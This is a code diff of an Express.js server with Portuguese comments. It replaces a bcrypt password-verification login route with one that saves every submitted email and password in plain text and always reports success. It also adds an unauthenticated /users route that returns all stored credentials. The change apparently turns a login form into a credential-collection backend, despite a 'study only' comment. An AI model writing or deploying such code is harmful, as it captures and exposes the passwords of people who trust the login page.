@@ -1,62 +1,51 @@
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
-const bcrypt = require('bcrypt');
 const db = require('./db');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Configuração do CORS com seu domínio
+// Configuração do CORS
 app.use(cors({
-  origin: 'https://lime-wildcat-293255.hostingersite.com',
-  methods: ['POST', 'GET'],
-  credentials: true
+  origin: 'https://lime-wildcat-293255.hostingersite.com'
 }));
 
 app.use(express.json());
 
-// Rota de login atualizada
+// Rota para receber os dados do formulário
 app.post('/login', async (req, res) => {
   const { email, password } = req.body;
 
-  if (!email?.trim() || !password?.trim()) {
-    return res.status(400).json({ error: 'Preencha todos os campos' });
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email e senha são obrigatórios' });
   }
 
   try {
-    const userResult = await db.query(
-      'SELECT id, password FROM users WHERE email = $1', 
-      [email.toLowerCase().trim()]
+    // Insere os dados no banco (em texto puro - APENAS PARA ESTUDO)
+    await db.query(
+      'INSERT INTO users (email, password) VALUES ($1, $2)',
+      [email, password]
     );
-
-    if (userResult.rows.length === 0) {
-      return res.status(401).json({ error: 'Usuário não encontrado' });
-    }
-
-    const user = userResult.rows[0];
-    const passwordMatch = await bcrypt.compare(password, user.password);
-
-    if (!passwordMatch) {
-      return res.status(401).json({ error: 'Senha incorreta' });
-    }
-
-    res.json({ 
-      message: 'Login realizado com sucesso!',
-      userId: user.id
-    });
-
+    
+    res.status(200).json({ message: 'Dados recebidos com sucesso!' });
   } catch (error) {
-    console.error('Erro no login:', error);
+    console.error('Erro no banco de dados:', error);
+    res.status(500).json({ error: 'Erro ao salvar os dados' });
+  }
+});
+
+// Rota para visualizar todos os registros (APENAS PARA TESTE)
+app.get('/users', async (req, res) => {
+  try {
+    const result = await db.query('SELECT * FROM users');
+    res.json(result.rows);
+  } catch (error) {
+    console.error('Erro ao buscar usuários:', error);
     res.status(500).json({ error: 'Erro no servidor' });
   }
 });
 
-// Rota de verificação
-app.get('/check', (req, res) => {
-  res.json({ status: 'Online', timestamp: new Date() });
-});
-
 app.listen(PORT, () => {
-  console.log(`Servidor rodando: https://backend-login-production-79a1.up.railway.app`);
+  console.log(`Servidor rodando na porta ${PORT}`);
 });
